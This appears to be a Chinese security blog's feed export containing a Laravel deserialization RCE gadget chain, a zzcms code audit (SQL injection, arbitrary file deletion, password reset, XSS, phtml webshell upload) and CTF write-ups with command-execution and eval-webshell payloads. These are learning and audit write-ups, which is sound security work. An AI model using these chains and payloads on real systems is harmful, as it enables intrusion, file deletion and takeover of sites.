    <span class="k">protected</span> <span class="nv">$instances</span><span class="o">=</span><span class="p">[];</span>
    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$instances</span><span class="o">=</span><span class="p">[]){</span>
    <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">instances</span><span class="p">[</span><span class="s1">&#39;Illuminate\Contracts\Console\Kernel&#39;</span><span class="p">]</span><span class="o">=</span><span class="nv">$instances</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="nv">$tmp</span><span class="o">=</span><span class="k">new</span> <span class="nx">Application</span><span class="p">();</span> <span class="c1">//最后需要返回这个实例，tmp作为中间层处理一下
</span><span class="c1"></span><span class="nv">$app</span><span class="o">=</span><span class="k">new</span> <span class="nx">Application</span><span class="p">(</span><span class="nv">$tmp</span><span class="p">);</span>

<span class="k">namespace</span> <span class="nx">Illuminate\Foundation\Testing</span><span class="p">;</span>
<span class="k">class</span> <span class="nc">PendingCommand</span><span class="p">{</span>
    <span class="k">public</span> <span class="nv">$test</span><span class="p">;</span>
    <span class="k">protected</span> <span class="nv">$app</span><span class="p">;</span>
    <span class="k">protected</span> <span class="nv">$command</span><span class="p">;</span>
    <span class="k">protected</span> <span class="nv">$parameters</span><span class="p">;</span>
    <span class="k">public</span>  <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$test</span><span class="p">,</span><span class="nv">$app</span><span class="p">,</span><span class="nv">$command</span><span class="p">,</span><span class="nv">$parameters</span><span class="p">){</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">test</span><span class="o">=</span><span class="nv">$test</span><span class="p">;</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">app</span><span class="o">=</span><span class="nv">$app</span><span class="p">;</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">command</span><span class="o">=</span><span class="nv">$command</span><span class="p">;</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">parameters</span><span class="o">=</span><span class="nv">$parameters</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="nv">$demo</span><span class="o">=</span> <span class="k">new</span> <span class="nx">PendingCommand</span><span class="p">(</span><span class="nv">$test</span><span class="p">,</span><span class="nv">$app</span><span class="p">,</span><span class="s2">&#34;system&#34;</span><span class="p">,</span><span class="k">array</span><span class="p">(</span><span class="s2">&#34;whoami&#34;</span><span class="p">));</span>
<span class="k">echo</span> <span class="nx">urlencode</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="nv">$demo</span><span class="p">));</span>
<span class="cp">?&gt;</span><span class="err">
</span></code></pre></div><p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-30-image-20210530204314832.png" alt="image-20210530204314832"></p>
<p>如果选择标注2的方法，我们需要对<code>bindings[$abstract]['concrete']</code>进行控制，而<code>$abstract</code>的值就是<code>Illuminate\Contracts\Console\Kernel</code>,所以我们能够利用二维数组控制<code>['concrete']</code>：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>

<span class="k">namespace</span> <span class="nx">Illuminate\Auth</span><span class="p">;</span>
<span class="k">class</span> <span class="nc">GenericUser</span>
<span class="p">{</span>
    <span class="k">protected</span> <span class="nv">$attributes</span><span class="p">;</span>
    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="k">array</span> <span class="nv">$attributes</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">attributes</span> <span class="o">=</span> <span class="nv">$attributes</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="nv">$array</span><span class="o">=</span><span class="k">array</span><span class="p">(</span><span class="s1">&#39;expectedOutput&#39;</span> <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span><span class="s2">&#34;0&#34;</span><span class="o">=&gt;</span><span class="s2">&#34;1&#34;</span><span class="p">),</span> <span class="s1">&#39;expectedQuestions&#39;</span> <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span><span class="s2">&#34;0&#34;</span><span class="o">=&gt;</span><span class="s2">&#34;1&#34;</span><span class="p">));</span>
<span class="nv">$test</span><span class="o">=</span><span class="k">new</span> <span class="nx">GenericUser</span><span class="p">(</span><span class="nv">$array</span><span class="p">);</span>

<span class="k">namespace</span> <span class="nx">Illuminate\Foundation</span><span class="p">;</span>
<span class="k">class</span> <span class="nc">Application</span>
<span class="p">{</span>
    <span class="k">protected</span> <span class="nv">$bindings</span><span class="o">=</span><span class="p">[];</span>
    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(){</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">bindings</span><span class="p">[</span><span class="s1">&#39;Illuminate\Contracts\Console\Kernel&#39;</span><span class="p">]</span><span class="o">=</span><span class="k">array</span><span class="p">(</span><span class="s2">&#34;concrete&#34;</span><span class="o">=&gt;</span><span class="s2">&#34;Illuminate\Container\Container&#34;</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="nv">$app</span><span class="o">=</span><span class="k">new</span> <span class="nx">Application</span><span class="p">();</span>

<span class="k">namespace</span> <span class="nx">Illuminate\Foundation\Testing</span><span class="p">;</span>
<span class="k">class</span> <span class="nc">PendingCommand</span><span class="p">{</span>
    <span class="k">public</span> <span class="nv">$test</span><span class="p">;</span>
    <span class="k">protected</span> <span class="nv">$app</span><span class="p">;</span>
    <span class="k">protected</span> <span class="nv">$command</span><span class="p">;</span>
    <span class="k">protected</span> <span class="nv">$parameters</span><span class="p">;</span>
    <span class="k">public</span>  <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$test</span><span class="p">,</span><span class="nv">$app</span><span class="p">,</span><span class="nv">$command</span><span class="p">,</span><span class="nv">$parameters</span><span class="p">){</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">test</span><span class="o">=</span><span class="nv">$test</span><span class="p">;</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">app</span><span class="o">=</span><span class="nv">$app</span><span class="p">;</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">command</span><span class="o">=</span><span class="nv">$command</span><span class="p">;</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">parameters</span><span class="o">=</span><span class="nv">$parameters</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="nv">$demo</span><span class="o">=</span> <span class="k">new</span> <span class="nx">PendingCommand</span><span class="p">(</span><span class="nv">$test</span><span class="p">,</span><span class="nv">$app</span><span class="p">,</span><span class="s2">&#34;system&#34;</span><span class="p">,</span><span class="k">array</span><span class="p">(</span><span class="s2">&#34;whoami&#34;</span><span class="p">));</span>
<span class="k">echo</span> <span class="nx">urlencode</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="nv">$demo</span><span class="p">));</span>

<span class="cp">?&gt;</span><span class="err">
</span><span class="err">
</span></code></pre></div><p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-30-image-20210530205343911.png" alt="image-20210530205343911"></p>
<p>最后关于<code>callback</code>的回调函数就不多说了。</p>
<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-30-image-20210530210120964.png" alt="image-20210530210120964"></p>
<h3 id="总结">总结</h3>
<p>不得不说这种框架类的反序列化pop链挖掘真的有意思，ctf中的反序列化更多是重于原生利用类的构造。不过这次的更新时间已经超过了之前定的一周两个&hellip;emm下一个目标应该在Thinkphp吧。</p>
<h3 id="参考">参考</h3>
<p><a href="https://www.3rsh1.cool/2020/07/23/lavarel_zhuan_ti_1/">https://www.3rsh1.cool/2020/07/23/lavarel_zhuan_ti_1/</a></p>
<p><a href="https://laworigin.github.io/2019/02/21/laravelv5-7%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96rce/">https://laworigin.github.io/2019/02/21/laravelv5-7%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96rce/</a></p>
]]></content>
		</item>
		
		<item>
			<title>zzcms code Audit</title>
			<link>https://theoyu.top/posts/codeaudit/zzcms/</link>
			<pubDate>Wed, 19 May 2021 19:25:18 +0800</pubDate>
			
			<guid>https://theoyu.top/posts/codeaudit/zzcms/</guid>
			<description>准备工作 虽然事先准备审这个cms,但是找源码还是花了不少时间，官网只有最新的版本，这里如果大家想要复现就直接下载这里的就好了。
为了模拟真实环境，我们在phpstudy上配置一下站点,并修改hosts文件即可开始动手啦。
0x01 sql注入 进入界面,就有一个很明显的搜索框,我们尝试1&#39; or 1=1 #
发现单引号被转义，search.php包含了/inc/conn.php,而后者又包含了inc/stopsqlin.php，对应代码:
可以看到这里会对我们POST,GET以及COOKIE中的数据进行转义,那如果想要继续进行下去我们要么就是找到没有包含 /inc/conn.php的组件，要么就是找到拼接sql语句的地方。
user/check.php是对我们身份进行验证的文件，如果cookie设置有username和password，就会执行一次sql查询,并且该文件奇幻的是没有包含上面说的过滤文件，还自己写了一个过滤函数，还只对username进行过滤,那么我们尝试一下password处。
不过这个路由设有对验证码的识别，而user/index.php包含了该函数,那我们可以直接在index.php测试。
那么这里也理所当然可以通过盲注拿数据,不过我在本地搭建的环境比较慢，平均延迟在4秒左右，就没有跑了，师傅们见谅。
比较遗憾的是管理员路由设置的为session参数验证，无法通过万能密码的方法登陆。
0x02 任意文件删除 在user/adv.php处，
不得不说这种对$_REQUEST没有限制的代码真的很恐怖,逻辑其实很简单只要$action等于modify和$img不等于$oldimg即可，并且这里没有对$oldimg过滤导致我们可以直接把../../admin/admin.php删除。
0x03 网站重装 在Install目录下，step1.php会首先判断是否存在install.lock文件，但是在step2.php及之后的文件都没有对其进行判断,并且step可控。
0x04 任意密码修改 漏洞点在one/getpassword.php
elseif($action==&amp;#34;step3&amp;#34; &amp;amp;&amp;amp; @$_SESSION[&amp;#39;username&amp;#39;]!=&amp;#39;&amp;#39;){ $passwordtrue = isset($_POST[&amp;#39;password&amp;#39;])?$_POST[&amp;#39;password&amp;#39;]:&amp;#34;&amp;#34;; $password=md5(trim($passwordtrue)); query(&amp;#34;update zzcms_user set password=&amp;#39;$password&amp;#39;,passwordtrue=&amp;#39;$passwordtrue&amp;#39; where username=&amp;#39;&amp;#34;.@$_SESSION[&amp;#39;username&amp;#39;].&amp;#34;&amp;#39;&amp;#34;); 利用样式和网址重装有些相似，也是POSTaction到step3直接修改密码,但这里需要我们知道被修改用户的$_SESSION[&#39;username&#39;],而在step1中我们可以看到：
if ($action==&amp;#34;step1&amp;#34;){ $username = isset($_POST[&amp;#39;username&amp;#39;])?$_POST[&amp;#39;username&amp;#39;]:&amp;#34;&amp;#34;; $_SESSION[&amp;#39;username&amp;#39;]=$username; ...... $_SESSION[&#39;username&#39;]有一个被我们赋值的过程，那我们只需先在step1中输入需要修改的username获取session，就可直接跳到step3修改密码。步骤如下：
然后直接修改密码,把action改为step3即可。
0x05 反射型xss 在inc/top.php处没有包含inc/conn.php，我们只需要将标签闭合即可实现反射型xss。
事实上admin用户的后台管理基本上没有什么过滤，存在很多存储型xss,但归于业务原因, 拿到admin权限也就不在乎这个级别漏洞了,感兴趣的师傅可以自行复现。
0x06 上传webshell 在uploadimg_form.php可以文件上传，不过这个路由非常突兀让我有了一种好像做ctf题的感觉..
回到正题,我们看看后端是怎么处理我们的文件的:uploadimg.php
function upfile() { //是否存在文件 if (!is_uploaded_file(@$this-&amp;gt;fileName[tmp_name])){ echo &amp;#34;&amp;lt;script&amp;gt;alert(&amp;#39;请点击“浏览”，先选择您要上传的文件！\\n\\n支持的图片类型为：jpg,gif,png,bmp&amp;#39;);parent.window.close();&amp;lt;/script&amp;gt;&amp;#34;; exit; } //检查文件大小 if ($this-&amp;gt;max_file_size*1024 &amp;lt; $this-&amp;gt;fileName[&amp;#34;size&amp;#34;]){ echo &amp;#34;&amp;lt;script&amp;gt;alert(&amp;#39;文件大小超过了限制！最大只能上传 &amp;#34;.</description>
			<content type="html"><![CDATA[<h2 id="准备工作">准备工作</h2>
<p>虽然事先准备审这个cms,但是找源码还是花了不少时间，官网只有最新的版本，这里如果大家想要复现就直接下载这里的就好了。</p>
<p>为了模拟真实环境，我们在<strong>phpstudy</strong>上配置一下站点,并修改hosts文件即可开始动手啦。</p>
<h2 id="0x01-sql注入">0x01 sql注入</h2>
<p>进入界面,就有一个很明显的搜索框,我们尝试<code>1' or 1=1 #</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-20-image-20210520195446877.png" alt="image-20210520195446877"></p>
<p>发现单引号被转义，<code>search.php</code>包含了<code>/inc/conn.php</code>,而后者又包含了<code>inc/stopsqlin.php</code>，对应代码:</p>
<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-20-image-20210520200128259.png" alt="image-20210520200128259"></p>
<p>可以看到这里会对我们<code>POST</code>,<code>GET</code>以及<code>COOKIE</code>中的数据进行转义,那如果想要继续进行下去我们要么就是找到没有包含 <code>/inc/conn.php</code>的组件，要么就是找到拼接sql语句的地方。</p>
<p><code>user/check.php</code>是对我们身份进行验证的文件，如果cookie设置有<code>username</code>和<code>password</code>，就会执行一次sql查询,并且该文件奇幻的是没有包含上面说的过滤文件，还自己写了一个过滤函数，还只对<code>username</code>进行过滤,那么我们尝试一下password处。</p>
<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-20-image-20210520201929542.png" alt="image-20210520201929542"></p>
<p>不过这个路由设有对验证码的识别，而<code>user/index.php</code>包含了该函数,那我们可以直接在<code>index.php</code>测试。</p>
<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-20-image-20210520203435308.png" alt="image-20210520203435308"></p>
<p>那么这里也理所当然可以通过盲注拿数据,不过我在本地搭建的环境比较慢，平均延迟在4秒左右，就没有跑了，师傅们见谅。</p>
<p>比较遗憾的是管理员路由设置的为<strong>session</strong>参数验证，无法通过万能密码的方法登陆。</p>
<h2 id="0x02-任意文件删除">0x02 任意文件删除</h2>
<p>在<code>user/adv.php</code>处，</p>
<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-20-image-20210520205041873.png" alt="image-20210520205041873"></p>
<p>不得不说这种对<code>$_REQUEST</code>没有限制的代码真的很恐怖,逻辑其实很简单只要<code>$action</code>等于<strong>modify</strong>和<code>$img</code>不等于<code>$oldimg</code>即可，并且这里没有对<code>$oldimg</code>过滤导致我们可以直接把<code>../../admin/admin.php</code>删除。</p>
<h2 id="0x03-网站重装">0x03 网站重装</h2>
<p>在Install目录下，step1.php会首先判断是否存在install.lock文件，但是在step2.php及之后的文件都没有对其进行判断,并且step可控。</p>
<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-20-image-20210520205732410.png" alt="image-20210520205732410"></p>
<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-20-image-20210520210143862.png" alt="image-20210520210143862"></p>
<h2 id="0x04-任意密码修改">0x04 任意密码修改</h2>
<p>漏洞点在<code>one/getpassword.php</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="k">elseif</span><span class="p">(</span><span class="nv">$action</span><span class="o">==</span><span class="s2">&#34;step3&#34;</span> <span class="o">&amp;&amp;</span> <span class="o">@</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]</span><span class="o">!=</span><span class="s1">&#39;&#39;</span><span class="p">){</span>
<span class="nv">$passwordtrue</span> <span class="o">=</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">])</span><span class="o">?</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">]</span><span class="o">:</span><span class="s2">&#34;&#34;</span><span class="p">;</span>
<span class="nv">$password</span><span class="o">=</span><span class="nx">md5</span><span class="p">(</span><span class="nx">trim</span><span class="p">(</span><span class="nv">$passwordtrue</span><span class="p">));</span>
<span class="nx">query</span><span class="p">(</span><span class="s2">&#34;update zzcms_user set password=&#39;</span><span class="si">$password</span><span class="s2">&#39;,passwordtrue=&#39;</span><span class="si">$passwordtrue</span><span class="s2">&#39; where username=&#39;&#34;</span><span class="o">.@</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&#34;&#39;&#34;</span><span class="p">);</span>
</code></pre></div><p>利用样式和网址重装有些相似，也是POST<strong>action</strong>到step3直接修改密码,但这里需要我们知道被修改用户的<code>$_SESSION['username']</code>,而在step1中我们可以看到：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="k">if</span> <span class="p">(</span><span class="nv">$action</span><span class="o">==</span><span class="s2">&#34;step1&#34;</span><span class="p">){</span>
<span class="nv">$username</span> <span class="o">=</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">])</span><span class="o">?</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]</span><span class="o">:</span><span class="s2">&#34;&#34;</span><span class="p">;</span>
<span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]</span><span class="o">=</span><span class="nv">$username</span><span class="p">;</span>
<span class="o">......</span>
</code></pre></div><p><code>$_SESSION['username']</code>有一个被我们赋值的过程，那我们只需先在step1中输入需要修改的username获取session，就可直接跳到step3修改密码。步骤如下：</p>
<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-20-image-20210520221904775.png" alt="image-20210520221904775"></p>
<p>然后直接修改密码,把action改为step3即可。</p>
<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-20-image-20210520222027782.png" alt=""></p>
<h2 id="0x05-反射型xss">0x05 反射型xss</h2>
<p>在<code>inc/top.php</code>处没有包含<code>inc/conn.php</code>，我们只需要将标签闭合即可实现反射型xss。</p>
<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-20-image-20210520210717678.png" alt="image-20210520210717678"></p>
<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-20-image-20210520212245204.png" alt="image-20210520212245204"></p>
<p>事实上<code>admin</code>用户的后台管理基本上没有什么过滤，存在很多存储型xss,但归于业务原因, 拿到admin权限也就不在乎这个级别漏洞了,感兴趣的师傅可以自行复现。</p>
<h2 id="0x06-上传webshell">0x06 上传webshell</h2>
<p>在<code>uploadimg_form.php</code>可以文件上传，不过这个路由非常突兀让我有了一种好像做ctf题的感觉..</p>
<p>回到正题,我们看看后端是怎么处理我们的文件的:<code>uploadimg.php</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="k">function</span> <span class="nf">upfile</span><span class="p">()</span> <span class="p">{</span>
<span class="c1">//是否存在文件
</span><span class="c1"></span><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">is_uploaded_file</span><span class="p">(</span><span class="o">@</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">fileName</span><span class="p">[</span><span class="nx">tmp_name</span><span class="p">])){</span>
   <span class="k">echo</span> <span class="s2">&#34;&lt;script&gt;alert(&#39;请点击“浏览”，先选择您要上传的文件！</span><span class="se">\\</span><span class="s2">n</span><span class="se">\\</span><span class="s2">n支持的图片类型为：jpg,gif,png,bmp&#39;);parent.window.close();&lt;/script&gt;&#34;</span><span class="p">;</span> <span class="k">exit</span><span class="p">;</span>
<span class="p">}</span>
<span class="c1">//检查文件大小
</span><span class="c1"></span><span class="k">if</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">max_file_size</span><span class="o">*</span><span class="mi">1024</span> <span class="o">&lt;</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">fileName</span><span class="p">[</span><span class="s2">&#34;size&#34;</span><span class="p">]){</span>
   <span class="k">echo</span> <span class="s2">&#34;&lt;script&gt;alert(&#39;文件大小超过了限制！最大只能上传 &#34;</span><span class="o">.</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">max_file_size</span><span class="o">.</span><span class="s2">&#34; K的文件&#39;);parent.window.close();&lt;/script&gt;&#34;</span><span class="p">;</span><span class="k">exit</span><span class="p">;</span>
<span class="p">}</span>
<span class="c1">//检查文件类型
</span><span class="c1"></span><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">in_array</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">fileName</span><span class="p">[</span><span class="s2">&#34;type&#34;</span><span class="p">],</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">uptypes</span><span class="p">))</span> <span class="p">{</span>
   <span class="k">echo</span> <span class="s2">&#34;&lt;script&gt;alert(&#39;文件类型错误，支持的图片类型为：jpg,gif,png,bmp&#39;);parent.window.close();&lt;/script&gt;&#34;</span><span class="p">;</span><span class="k">exit</span><span class="p">;</span>
<span class="p">}</span>
<span class="c1">//检查文件后缀
</span><span class="c1"></span><span class="nv">$hzm</span><span class="o">=</span><span class="nx">strtolower</span><span class="p">(</span><span class="nx">substr</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">fileName</span><span class="p">[</span><span class="s2">&#34;name&#34;</span><span class="p">],</span><span class="nx">strpos</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">fileName</span><span class="p">[</span><span class="s2">&#34;name&#34;</span><span class="p">],</span><span class="s2">&#34;.&#34;</span><span class="p">)));</span><span class="c1">//获取.后面的后缀，如可获取到.php.gif
</span><span class="c1"></span><span class="k">if</span> <span class="p">(</span><span class="nx">strpos</span><span class="p">(</span><span class="nv">$hzm</span><span class="p">,</span><span class="s2">&#34;php&#34;</span><span class="p">)</span><span class="o">!==</span><span class="k">false</span> <span class="o">||</span> <span class="nx">strpos</span><span class="p">(</span><span class="nv">$hzm</span><span class="p">,</span><span class="s2">&#34;asp&#34;</span><span class="p">)</span><span class="o">!==</span><span class="k">false</span> <span class="o">||</span><span class="nx">strpos</span><span class="p">(</span><span class="nv">$hzm</span><span class="p">,</span><span class="s2">&#34;jsp&#34;</span><span class="p">)</span><span class="o">!==</span><span class="k">false</span><span class="p">){</span>
<span class="k">echo</span> <span class="s2">&#34;&lt;script&gt;alert(&#39;&#34;</span><span class="o">.</span><span class="nv">$hzm</span><span class="o">.</span><span class="s2">&#34;，这种文件不允许上传&#39;);parent.window.close();&lt;/script&gt;&#34;</span><span class="p">;</span><span class="k">exit</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div><p>首先判断是否存在文件,再判断文件大小，然后判断文件类型,这里用<strong>GIF89a</strong>可以绕过，最后是一个黑名单的后缀验证,我们使用phtml即可绕过。</p>
<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-20-image-20210520214742983.png" alt="image-20210520214742983"></p>
<p>需要注意的是，<code>phtml</code>需要管理员在apche配置中设置,不然会直接把源码打印没有解析,并且我在测试的过程中发现php7即使设置了解析,访问<code>.phtml</code>文件的效果是直接下载文件,而php5版本可以成功。</p>
<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-20-image-20210520220014941.png" alt="image-20210520220014941"></p>
<h2 id="总结">总结</h2>
<p>虽然是入门级别的框架，但也来来回回审了两三天，不得不说代码审计一定需要静下心来看慢慢看。这个框架的漏洞利用点更多是在设计者本身对输入的过滤不严格所导致的，而且逻辑上也有很大的问题。之前在师傅博客看到这样一句话：<strong>知识面宽度决定攻击面广度,知识链深度决定攻击链的长度</strong>，虽然这是一次简单的白盒审计，不过也给黑盒测试提供了很多思路。</p>
<p>不过也是这次审计让我意识到自己对代码的敏感能力还是不够高，之前复现一些laravel和Yii的大型框架基本上都是拿着大师傅们的脚本直接打。学习还是一步一步好,戒骄戒躁。</p>
]]></content>
		</item>
		
		<item>
			<title>2021↑ WP汇总</title>
			<link>https://theoyu.top/posts/2021/</link>
			<pubDate>Mon, 17 May 2021 20:24:32 +0800</pubDate>
			
			<guid>https://theoyu.top/posts/2021/</guid>
			<description>0x01 NEPCTF 周末比较忙，做了两道题。
little_trick &amp;lt;?php error_reporting(0); highlight_file(__FILE__); $nep = $_GET[&amp;#39;nep&amp;#39;]; $len = $_GET[&amp;#39;len&amp;#39;]; if(intval($len)&amp;lt;8 &amp;amp;&amp;amp; strlen($nep)&amp;lt;13){ eval(substr($nep,0,$len)); }else{ die(&amp;#39;too long!&amp;#39;); } ?&amp;gt;关于len这个点还挺好说的，-1就绕了，那么题目就变成了限制长度为12的命令执行。方法还挺多的。
solution 1 hitcon之前做了限制长度4或5的命令执行,4和5都可以了，那12自然不在话下，这里就不过多阐述了。
solution 2 事实上这题没那么麻烦，因为我们可控制字符还是比较长的，我们先测试一下:
?nep=`ls&amp;gt;z`;&amp;amp;len=7访问一下z我们发现了
index.phpnep.phpz很明显flag就在nep.php里，那只需
&amp;gt;cat *&amp;gt;z再访问z即可。
solution3 ?nep=`$_GET[a]`;1&amp;amp;len=-1&amp;amp;a=echo &amp;quot;&amp;lt;?php eval(\$_POST[theoyu]);&amp;quot;&amp;gt;theoyu.phpsolution4 这个是看一位老哥的wp时发现的，确实巧妙。 首先鉴于php的弱类型，intval会把字符串数字后给截断，导致比如7;agawg识别为7，然后里用?nep=$len达到内联执行的效果。
?nep=`$len`;&amp;amp;len=7;echo &amp;quot;&amp;lt;?php @eval(\$_POST[theoyu])?&amp;gt;&amp;quot; &amp;gt; theoyu.php梦里花开牡丹亭  考察php原生类的利用
 源码：
&amp;lt;?php highlight_file(__FILE__); error_reporting(0); include(&amp;#39;shell.php&amp;#39;); class Game{ public $username; public $password; public $choice; public $register; public $file; public $filename; public $content; public function __construct() { $this-&amp;gt;username=&amp;#39;user&amp;#39;; $this-&amp;gt;password=&amp;#39;user&amp;#39;; } public function __wakeup(){ if(md5($this-&amp;gt;register)===&amp;#34;21232f297a57a5a743894a0e4a801fc3&amp;#34;){ $this-&amp;gt;choice=new login($this-&amp;gt;file,$this-&amp;gt;filename,$this-&amp;gt;content); }else{ $this-&amp;gt;choice = new register(); } } public function __destruct() { $this-&amp;gt;choice-&amp;gt;checking($this-&amp;gt;username,$this-&amp;gt;password); } } class login{ public $file; public $filename; public $content; public function __construct($file,$filename,$content) { $this-&amp;gt;file=$file; $this-&amp;gt;filename=$filename; $this-&amp;gt;content=$content; } public function checking($username,$password) { if($username===&amp;#39;admin&amp;#39;&amp;amp;&amp;amp;$password===&amp;#39;admin&amp;#39;){ $this-&amp;gt;file-&amp;gt;open($this-&amp;gt;filename,$this-&amp;gt;content); die(&amp;#39;login success you can to open shell file!</description>
			<content type="html"><![CDATA[<h2 id="0x01-nepctf">0x01 NEPCTF</h2>
<p>周末比较忙，做了两道题。</p>
<h3 id="little_trick">little_trick</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
    <span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
    <span class="nv">$nep</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;nep&#39;</span><span class="p">];</span>
    <span class="nv">$len</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;len&#39;</span><span class="p">];</span>
    <span class="k">if</span><span class="p">(</span><span class="nx">intval</span><span class="p">(</span><span class="nv">$len</span><span class="p">)</span><span class="o">&lt;</span><span class="mi">8</span> <span class="o">&amp;&amp;</span> <span class="nx">strlen</span><span class="p">(</span><span class="nv">$nep</span><span class="p">)</span><span class="o">&lt;</span><span class="mi">13</span><span class="p">){</span>
        <span class="k">eval</span><span class="p">(</span><span class="nx">substr</span><span class="p">(</span><span class="nv">$nep</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="nv">$len</span><span class="p">));</span>
    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
        <span class="k">die</span><span class="p">(</span><span class="s1">&#39;too long!&#39;</span><span class="p">);</span>
    <span class="p">}</span>
<span class="cp">?&gt;</span><span class="err">
</span></code></pre></div><p>关于<code>len</code>这个点还挺好说的，<strong>-1</strong>就绕了，那么题目就变成了<strong>限制长度为12</strong>的命令执行。方法还挺多的。</p>
<h4 id="solution-1">solution 1</h4>
<p>hitcon之前做了<strong>限制长度4或5的命令执行</strong>,4和5都可以了，那12自然不在话下，这里就不过多阐述了。</p>
<h4 id="solution-2">solution 2</h4>
<p>事实上这题没那么麻烦，因为我们可控制字符还是比较长的，我们先测试一下:</p>
<pre><code class="language-demo" data-lang="demo">?nep=`ls&gt;z`;&amp;len=7
</code></pre><p>访问一下<code>z</code>我们发现了</p>
<pre><code class="language-test" data-lang="test">index.php
nep.php
z
</code></pre><p>很明显flag就在<code>nep.php</code>里，那只需</p>
<pre><code>&gt;cat 
*&gt;z
</code></pre><p>再访问<code>z</code>即可。</p>
<h4 id="solution3">solution3</h4>
